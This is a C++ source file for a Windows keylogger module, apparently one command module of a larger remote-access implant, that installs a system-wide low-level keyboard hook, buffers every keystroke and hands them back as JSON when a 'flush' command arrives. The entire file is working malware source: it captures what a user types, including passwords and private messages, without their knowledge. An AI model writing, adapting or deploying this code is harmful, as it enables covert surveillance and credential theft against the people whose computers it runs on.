// keylog module (B6, Windows only).
//
// arguments[0] = "start" to install the hook, "flush" to drain the buffer.
//
// The hook lives on a dedicated message-only thread that pumps a
// WH_KEYBOARD_LL hook. Keystrokes are buffered in a process-global deque;
// the `flush` command returns the contents as a single JSON string and
// clears the buffer. Multiple flushes yield what was captured since the
// last flush.

#include "../../json.hpp"
#include "../../protocol.h"

#include <deque>
#include <mutex>
#include <string>
#include <thread>

#include <windows.h>

namespace {

std::mutex g_mu;
std::deque<std::string> g_buf;
HHOOK g_hook = nullptr;
std::thread g_pump;
std::atomic<bool> g_running{false};

LRESULT CALLBACK ll_keyboard_proc(int code, WPARAM wp, LPARAM lp) {
    if (code == HC_ACTION && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN)) {
        auto* k = reinterpret_cast<KBDLLHOOKSTRUCT*>(lp);
        char buf[8] = {};
        int n = GetKeyNameTextA(k->scanCode << 16, buf, sizeof(buf));
        std::string s;
        if (n > 0) s.assign(buf, n);
        else s = std::string("[vk:") + std::to_string((int)k->vkCode) + "]";
        std::lock_guard<std::mutex> lock(g_mu);
        g_buf.push_back(s);
        if (g_buf.size() > 4096) g_buf.pop_front();
    }
    return CallNextHookEx(g_hook, code, wp, lp);
}

DWORD WINAPI hook_thread(LPVOID) {
    MSG msg;
    // A WH_KEYBOARD_LL hook *requires* a message loop on the installing
    // thread. We sit in GetMessage forever.
    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, ll_keyboard_proc,
                               GetModuleHandleA(nullptr), 0);
    while (g_running.load() && GetMessageA(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    if (g_hook) {
        UnhookWindowsHookEx(g_hook);
        g_hook = nullptr;
    }
    return 0;
}

void start() {
    if (g_running.load()) return;
    g_running.store(true);
    DWORD tid = 0;
    HANDLE ht = CreateThread(nullptr, 0, hook_thread, nullptr, 0, &tid);
    if (ht) CloseHandle(ht);
}

std::string flush() {
    std::lock_guard<std::mutex> lock(g_mu);
    std::string out;
    while (!g_buf.empty()) {
        out += g_buf.front();
        out += " ";
        g_buf.pop_front();
    }
    nlohmann::json j = {{"text", out}, {"size", out.size()}};
    return j.dump();
}

} // namespace

namespace nagomio_modules {

std::string handle_keylog(const std::vector<std::string>& args) {
    std::string mode = args.empty() ? "flush" : args[0];
    if (mode == "start") {
        start();
        return std::string(R"({"status":"started"})");
    }
    if (mode == "flush") {
        return flush();
    }
    return std::string(R"({"error":"unknown mode"})");
}

} // namespace nagomio_modules